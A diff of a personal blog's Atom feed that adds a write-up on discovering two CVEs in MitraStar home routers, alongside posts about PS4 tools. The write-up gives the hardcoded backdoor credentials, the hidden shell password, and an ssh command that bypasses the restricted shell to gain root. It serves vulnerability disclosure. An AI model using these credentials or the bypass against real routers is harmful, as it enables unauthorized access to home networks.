@@ -1,4 +1,252 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-16T16:10:23+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">j0lama</title><subtitle>Computer engineering and hacking stuff</subtitle><entry><title type="html">PS4ME (PS4 Memory Editor)</title><link href="http://localhost:4000/ps4me/" rel="alternate" type="text/html" title="PS4ME (PS4 Memory Editor)" /><published>2017-03-25T00:00:00+01:00</published><updated>2017-03-25T00:00:00+01:00</updated><id>http://localhost:4000/ps4me</id><content type="html" xml:base="http://localhost:4000/ps4me/">&lt;p&gt;As I said on my &lt;a href=&quot;/ps4-rte/&quot;&gt;last post&lt;/a&gt;, my main objective is to develop a software similar to PS3TMAPI/PS3CCAPI but for PS4.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-19T14:58:46+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">j0lama</title><subtitle>Computer engineering and hacking stuff</subtitle><entry><title type="html">MitraStar routers Remote Privilege Escalation</title><link href="http://localhost:4000/router-attack/" rel="alternate" type="text/html" title="MitraStar routers Remote Privilege Escalation" /><published>2017-10-23T00:00:00+02:00</published><updated>2017-10-23T00:00:00+02:00</updated><id>http://localhost:4000/router-attack</id><content type="html" xml:base="http://localhost:4000/router-attack/">&lt;p&gt;In this post I will describe how I discovered the vulnerabilities &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-16522&quot;&gt;CVE-2017-16522&lt;/a&gt; and &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-16523&quot;&gt;CVE-2017-16523&lt;/a&gt;. These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with with version up to november 2017.&lt;/p&gt;
+
+&lt;p&gt;The devices where the research has been made are the MitraStar DSL-100HN-T1 (“&lt;em&gt;the old&lt;/em&gt;”) and the MitraStar GPT-2541GNAC (HGU) (“&lt;em&gt;the new&lt;/em&gt;”).&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;The old&lt;/em&gt; with a firmware version ES_113WJY0b16:&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+      &lt;img src=&quot;/images/router-attack/old.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;The new&lt;/em&gt; with a firmware version 1.00(VNJ0)b1:&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+      &lt;img src=&quot;/images/router-attack/new.jpg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;These two vulnerabilities can be considered as only one that elevate privileges remotely on the router avoiding the preseted shell.&lt;/p&gt;
+
+&lt;h4 id=&quot;getting-access-to-the-router&quot;&gt;Getting access to the router&lt;/h4&gt;
+
+&lt;p&gt;THe first thing that I did was a port scanning with the tool &lt;em&gt;nmap&lt;/em&gt; in the old:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &amp;lt;router_ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;With the the following result:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE    SERVICE
+21/tcp    open     ftp
+22/tcp    open     ssh
+23/tcp    filtered telnet
+53/tcp    open     domain
+80/tcp    open     http
+443/tcp   open     https
+8080/tcp  open     http-proxy
+49152/tcp open     unknown
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This router has &lt;em&gt;ssh&lt;/em&gt; running on the port 22 and with some google searches I found that the default user is &lt;em&gt;admin&lt;/em&gt; and the password is under the router.
+I also discovered months later with reverse engineering that in some routers exist a user call &lt;em&gt;zyad1234&lt;/em&gt; with password &lt;em&gt;zyad1234&lt;/em&gt; (Vulnerability CVE-2017-16523).&lt;/p&gt;
+
+&lt;p&gt;In my case, with the &lt;em&gt;admin&lt;/em&gt; user I could get access to the router.&lt;/p&gt;
+
+&lt;p&gt;When yoy log in to the router throungh &lt;em&gt;ssh&lt;/em&gt; the router provides you a limitate shell with some commands that allow you to modify some parameters such as the DHCP, lan parameters, and install updates and configurations. All this functions can be executed through the router’s configuration website at 192.168.1.1.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh 1234@192.168.1.3
+1234@192.168.1.3&lt;span class=&quot;s1&quot;&gt;'s password: 
+ &amp;gt;ls
+Can'&lt;/span&gt;t find &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Type &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;?
+Valid commands are:
+?               &lt;span class=&quot;nb&quot;&gt;exit            &lt;/span&gt;save            sys             restoredefault
+wan             lan             igmp            wlan            nat
+routing         
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;sys
+Missing subcommand. Valid subcommands are:
+process         userPasswd      passwd          telnetd         state
+swversion       swupdate        updatecfg       backupcfg       dumpcfg
+sysdiagd        firewall        upnp            reboot          exitOnIdle
+ppp             
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;sys swversion
+V1.13&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WJY.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;b15
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;looking-for-some-bugs&quot;&gt;Looking for some bugs&lt;/h4&gt;
+
+&lt;p&gt;The first thing that I tried was to introduce a long string to produce a buffer overflow or some crashes:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Cant find &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]. Type &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With the impossibility of find a buffer overflow I introduced accidentally the &lt;em&gt;sh&lt;/em&gt; command:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;sh
+Password:Password incorrect &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This output means that there is a &lt;em&gt;sh&lt;/em&gt; command that requires a password and it should give you access to a more privilege shell but the password is unknown.&lt;/p&gt;
+
+&lt;h4 id=&quot;using-other-versions&quot;&gt;Using other versions&lt;/h4&gt;
+
+&lt;p&gt;Afer days without any result I decided to use the other router (&lt;em&gt;the new&lt;/em&gt;). This router has a differente software version with the same pseudo-shell but with more commands such as &lt;em&gt;cat&lt;/em&gt; (used to check if a specific file exists) or the &lt;em&gt;ps&lt;/em&gt; command:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
+1234:Mt3cwxDUQQ7AY:0:0:Administrator:/:/bin/sh
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ps
+  PID USER       VSZ STAT COMMAND
+    1 1234      1700 S    init
+    2 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kthreadd]
+    3 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ksoftirqd/0]
+    5 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/u:0]
+    6 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;migration/0]
+    7 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;migration/1]
+    9 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ksoftirqd/1]
+   11 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;khelper]
+   54 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sync_supers]
+   56 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bdi-default]
+   58 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kblockd]
+   75 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;skbFreeTask]
+   92 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kswapd0]
+   93 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fsnotify_mark]
+   94 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;crypto]
+  151 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock0]
+  156 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock1]
+  161 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock2]
+  166 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock3]
+  171 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock4]
+  176 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock5]
+  181 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock6]
+  186 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock7]
+  191 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock8]
+  202 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;linkwatch]
+  212 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;deferwq]
+  219 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jffs2_gcd_mtd2]
+  220 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jffs2_gcd_mtd6]
+  221 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jffs2_gcd_mtd7]
+  222 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jffs2_gcd_mtd8]
+  229 1234      2532 S &amp;lt;  /bin/mm.exe
+  233 1234      2532 S    /bin/mm.exe
+  234 1234      2532 S    /bin/mm.exe
+  235 1234      2532 S    /bin/mm.exe
+  236 1234      2532 S    /bin/mm.exe
+  237 1234      8596 S &amp;lt;  /bin/icf.exe
+  256 1234         0 DW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Pon]
+  262 1234      8596 S &amp;lt;  /bin/icf.exe
+  263 1234      8596 S &amp;lt;  /bin/icf.exe
+  275 1234      1692 D    &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /dev/rgs_logger
+  449 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bcmFlwStatsTask]
+  496 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bcmsw_rx]
+  515 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bcmsw]
+  525 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wfd]
+  529 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wl0-kthrd]
+  623 1234      6248 S    /bin/smd
+  626 1234      6884 S    ssk
+  641 1234      1444 S    dnsproxy
+  644 1234      1420 S    sntp &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; hora.ngn.rima-tde.net &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; CET-1CEST,M3.5.0/2:
+  669 1234      2048 S    dhcpd
+  818 1234      3768 S    rastatus6
+ 1283 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/u:2]
+ 1320 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1495 1234      6776 S    mcpd
+ 1496 1234      8760 S    omcid &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 0 start
+ 1625 1234      9576 S    omcipmd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1626 1234       928 S    cpuload
+ 1627 1234      7896 S    wlmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1628 1234      8128 S    voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1629 1234      6644 S    rmt_qcsmngr_watchDog &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1634 1234      6600 S    /bin/sskwatchdog
+ 1643 1234      7896 S    wlmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1644 1234      7896 S    wlmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1668 1234      8128 S    voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1669 1234      8128 S    voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1697 1234      1700 S    -/bin/sh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; consoled
+ 1699 1234      9036 S    consoled
+ 1706 1234      1404 S    /bin/wlevt
+ 1709 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1710 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1711 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1712 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1713 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1714 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1715 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1718 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1719 1234      2532 S &amp;lt;  /bin/mm.exe
+ 1720 1234      2532 S    /bin/mm.exe
+ 1721 1234      8128 S &amp;lt;  voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1722 1234      8128 S &amp;lt;  voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1723 1234      8128 S    voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 1845 1234      1628 S    /bin/lld2d br0
+ 1850 1234      1552 S    /bin/eapd
+ 1853 1234      1920 S    /bin/nas
+ 1863 1234      1652 S    /bin/acsd
+ 1865 1234      2972 S    /bin/wps_monitor
+ 1936 1234      1020 S    radvd &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; /var/radvd.conf
+ 2101 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 2102 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 2103 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 2104 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 7349 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:0]
+ 7638 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:2]
+ 8290 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;flush-mtd-unmap]
+ 8565 1234      9300 S    sshd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 8578 1234      9308 S    sshd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+ 8847 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:0]
+ 8956 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:1]
+ 9455 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:2]
+ 9944 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:1]
+10047 1234      1696 S    sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; ps
+10048 1234      1700 R    ps
+25183 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:3]
+30628 1234      1696 S    sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /bin/sh
+30629 1234      1696 S    /bin/sh
+30892 1234      9256 R    ./sshd
+32030 1234      1696 S    sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /bin32031 1234      1696 S    /bin32079 1234      9256 R    ./sshd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After explore some commands I found the &lt;em&gt;deviceinfo&lt;/em&gt; command that offers the following possibilities:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; deviceinfo
+Usage: deviceinfo show serialnumber
+   deviceinfo show ploampw
+   deviceinfo &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;serialnumber &amp;lt;value&amp;gt;
+   deviceinfo &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;ploampw &amp;lt;value&amp;gt;
+   deviceinfo show datetime
+   deviceinfo show cpuload
+   deviceinfo show meminfo
+   deviceinfo show file &amp;lt;path&amp;gt;
+   deviceinfo show interface
+   deviceinfo &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The command &lt;em&gt;deviceinfo show file /&lt;/em&gt; works as the &lt;em&gt;ls&lt;/em&gt; command and allows us to list all the files and directories that are in /:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; deviceinfo show file /
+app          debug        linuxrc      sbin         usrcfg
+bin          dev          mnt          sys          var
+cfg_upgrade  etc          opt          tmp          vmlinux.lz
+data         lib          proc         usr          webs
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I was generating the file system tree and looking for some files with information about the &lt;em&gt;sh&lt;/em&gt; command password but I didn’t find anything.&lt;/p&gt;
+
+&lt;h4 id=&quot;the-vulnerability&quot;&gt;The vulnerability&lt;/h4&gt;
+&lt;p&gt;The next day I came back to &lt;em&gt;the old&lt;/em&gt; to try new things but surprisingly I decided to try something unusual. Instead of connect with the router with the command *ssh admin@&lt;router_ip&gt;*, I decided to add the path to the *sh* binary (/bin/sh) as second parameter because by default *ssh* execute the command passed as argument.&lt;/router_ip&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh 1234@192.168.1.2 &amp;lt;comand&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The output was the following:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh 1234@192.168.1.3 /bin/sh
+1234@192.168.1.3&lt;span class=&quot;s1&quot;&gt;'s password: 
+
+					
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This looked like there was something wrong and I was waiting for connection but I tried to introduce the &lt;em&gt;ls&lt;/em&gt; command and surprisingly was executed succesfully!
+I had access to an privilege shell with a complete root access to the system.&lt;/p&gt;
+
+&lt;h4 id=&quot;some-reverse-engineering&quot;&gt;Some reverse engineering&lt;/h4&gt;
+
+&lt;p&gt;I found that the default shell for ssh was a binary call cmdsh in the /bin/ folder.&lt;/p&gt;
+
+&lt;p&gt;I was still needing the &lt;em&gt;sh&lt;/em&gt; command password so I decided to bring the binary to my laptop an execute IDA Pro.
+The binary was compiled for MIPS architecture and I only needed to find where the string “Password incorrect!” is used to see a condition before, that compare a string with the string “c93vu02jp4z04”, the &lt;em&gt;sh&lt;/em&gt; password.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+      &lt;img src=&quot;/images/router-attack/ida.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h4 id=&quot;conclutions&quot;&gt;Conclutions&lt;/h4&gt;
+
+&lt;p&gt;I hope you had enjoy reading as much I do writing this post and over all learning something new.
+If you want more post like this one make it me know thorugh Twitter or buying me a &lt;a href=&quot;https://ko-fi.com/jolama&quot;&gt;Ko-Fi&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">In this post I will describe how I discovered the vulnerabilities CVE-2017-16522 and CVE-2017-16523. These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with with version up to november 2017.</summary></entry><entry><title type="html">PS4ME (PS4 Memory Editor)</title><link href="http://localhost:4000/ps4me/" rel="alternate" type="text/html" title="PS4ME (PS4 Memory Editor)" /><published>2017-03-25T00:00:00+01:00</published><updated>2017-03-25T00:00:00+01:00</updated><id>http://localhost:4000/ps4me</id><content type="html" xml:base="http://localhost:4000/ps4me/">&lt;p&gt;As I said on my &lt;a href=&quot;/ps4-rte/&quot;&gt;last post&lt;/a&gt;, my main objective is to develop a software similar to PS3TMAPI/PS3CCAPI but for PS4.&lt;/p&gt;
 
 &lt;p&gt;PS4ME.dll is a shared Windows library with all the required functions to connect with a 1.76 PS4 and read/write any process memory.&lt;/p&gt;
 
@@ -280,12 +528,13 @@ If we zoom in the signal, it can be appreciate that are some parts with a big am
 &lt;p&gt;Thanks to s0cKrate5 for the TouchPAD support.&lt;/p&gt;
 
 &lt;h2 id=&quot;download&quot;&gt;Download&lt;/h2&gt;
-&lt;p&gt;The source code has been released on my GitHUb account: &lt;a href=&quot;https://github.com/j0lama/DS4Lib&quot;&gt;Download&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">DS4Lib is a C written library that allows you controll a DualShock 4 (PS4 controller) from the computer. This library is open source and has been designed to be used in any Linux computer through the USB port.</summary></entry><entry><title type="html">PS4 PUP Extractor</title><link href="http://localhost:4000/ps4-pup-extractor/" rel="alternate" type="text/html" title="PS4 PUP Extractor" /><published>2016-07-03T00:00:00+02:00</published><updated>2016-07-03T00:00:00+02:00</updated><id>http://localhost:4000/ps4-pup-extractor</id><content type="html" xml:base="http://localhost:4000/ps4-pup-extractor/">&lt;p&gt;This tools allows you extract data and infromation from the PS4 PUP files (PS4UPDAT.PUP).
-Also it shows file information with a list of the files that compose the PUP file. This tool includes an option to extract all the subfiles with information about them such as the offset and size.&lt;/p&gt;
+&lt;p&gt;The source code has been released on my GitHUb account: &lt;a href=&quot;https://github.com/j0lama/DS4Lib&quot;&gt;Download&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">DS4Lib is a C written library that allows you controll a DualShock 4 (PS4 controller) from the computer. This library is open source and has been designed to be used in any Linux computer through the USB port.</summary></entry><entry><title type="html">PS4 PUP Extractor</title><link href="http://localhost:4000/ps4-pup-extractor/" rel="alternate" type="text/html" title="PS4 PUP Extractor" /><published>2016-07-03T00:00:00+02:00</published><updated>2016-07-03T00:00:00+02:00</updated><id>http://localhost:4000/ps4-pup-extractor</id><content type="html" xml:base="http://localhost:4000/ps4-pup-extractor/">&lt;p&gt;This tools allows you extract data and infromation from the PS4 PUP files (PS4UPDAT.PUP).&lt;/p&gt;
+
+&lt;p&gt;Also it shows file information with a list of the files that compose the PUP file. This tool includes an option to extract all the subfiles with information about them such as the offset and size.&lt;/p&gt;
 
 &lt;p&gt;PS4 PUP Extractor:&lt;/p&gt;
 &lt;p align=&quot;center&quot;&gt;
       &lt;img src=&quot;/images/ps4-pup-extractor/image.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;The download is available in this link: &lt;a href=&quot;http://www.mediafire.com/file/daw1d5iaap03yhe/PS4+PUP+Extractor.exe&quot;&gt;Download&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">This tools allows you extract data and infromation from the PS4 PUP files (PS4UPDAT.PUP). Also it shows file information with a list of the files that compose the PUP file. This tool includes an option to extract all the subfiles with information about them such as the offset and size.</summary></entry></feed>
+&lt;p&gt;The download is available in this link: &lt;a href=&quot;http://www.mediafire.com/file/daw1d5iaap03yhe/PS4+PUP+Extractor.exe&quot;&gt;Download&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">This tools allows you extract data and infromation from the PS4 PUP files (PS4UPDAT.PUP).</summary></entry></feed>
